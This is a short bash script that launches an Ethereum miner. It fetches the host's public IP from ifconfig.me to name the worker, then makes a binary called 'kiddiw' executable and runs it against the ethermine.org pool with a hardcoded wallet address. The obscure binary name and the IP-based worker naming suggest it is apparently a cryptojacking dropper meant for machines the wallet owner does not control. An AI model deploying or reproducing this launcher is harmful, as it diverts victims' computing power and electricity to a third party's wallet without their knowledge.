#!/bin/bash

#################################
## Begin of user-editable part ##
#################################

POOL=eu1.ethermine.org:4444
WALLET=0x53d5568dc68a4cf0057172029d248b7e9ec33c1d
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-

#################################
##  End of user-editable part  ##
#################################

cd "$(dirname "$0")"

chmod +x ./kiddiw &&  ./kiddiw --algo ETHASH --pool $POOL --user $WALLET.$WORKER
